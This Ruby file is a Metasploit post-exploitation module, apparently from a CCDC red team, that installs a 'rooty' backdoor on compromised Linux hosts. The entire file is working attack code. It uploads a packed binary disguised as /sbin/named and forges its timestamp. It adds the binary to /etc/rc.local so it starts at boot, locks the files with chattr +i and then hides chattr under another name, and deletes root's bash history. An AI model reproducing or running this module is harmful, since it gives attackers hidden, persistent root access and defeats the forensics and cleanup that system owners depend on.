class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Post::Linux::System

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Install rooty backdoor',
      'Description'   => %q{
        Install rooty backdoor for the correct environment.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'hal'
        ],
      'Platform'      => ['linux'],
      'SessionTypes'  => ['shell']
    ))

  register_options(
      [
        OptString.new('ROOTY_PATH',     [true, 'The base path to the rooty binaries.', '/root/ccdc/linux/rooty/bin' ]),
        OptString.new('BACKDOOR_PATHS',  [true, 'Where to copy rooty to be executed', '/sbin/named']),
      ], self.class)
  end

  def run
    distro = nil

    0.upto(10) do |i|
      begin
        distro = get_sysinfo
        break
      rescue ::Exception => e
        print_error("Failed to get system info.  Retrying...")
        Rex.sleep(1)
      end 
    end
    
    hardware = nil
    interface = nil
  
    if distro.nil?
      print_error("Unable to get distro information")
      return nil
    end
    
    if distro[:kernel] =~ /x86_64/
      hardware = "x86_64"
    elsif distro[:kernel] =~ /i\d86/
      hardware = "i686"
    else
      print_error("Unable to determine hardware architecture")
      return nil
    end

    if distro[:distro] =~ /(amazon|cent|redhat|debian|ubuntu|linux)/i
      datastore['BACKDOOR_PATHS'].split(',').each do |backdoor_path|
        print_status("Uploading rooty binary for #{distro[:distro]} #{hardware} systems to #{backdoor_path}")
        upload_file(backdoor_path, "#{datastore['ROOTY_PATH']}/linux/#{hardware}/rooty-upx")
        cmd_exec("touch -r /etc/services #{backdoor_path}")
        cmd_exec("chmod 755 #{backdoor_path}")
        cmd_exec("echo '#{backdoor_path} \&' >> /etc/rc.local")
        cmd_exec("/usr/bin/chattr +i #{backdoor_path}")
      end

      print_status("Starting the backdoor")
      cmd_exec("chmod 755 /etc/rc.local")
      cmd_exec("touch -r /etc/services /usr/bin/sla")
      cmd_exec("grep -v exit /etc/rc.local > /tmp/rc.local")
      cmd_exec("mv /tmp/rc.local /etc/rc.local")
      cmd_exec("echo 'exit 0' >> /etc/rc.local")
      cmd_exec("sh /etc/rc.local")
      cmd_exec("/usr/bin/chattr +i /etc/rc.local")
      cmd_exec("mv /usr/bin/chattr /usr/bin/sla")
      cmd_exec("rm /root/.bash_history")
    else
      print_error("Unknown distrobution: #{distro[:distro]}")
    end

  end
end

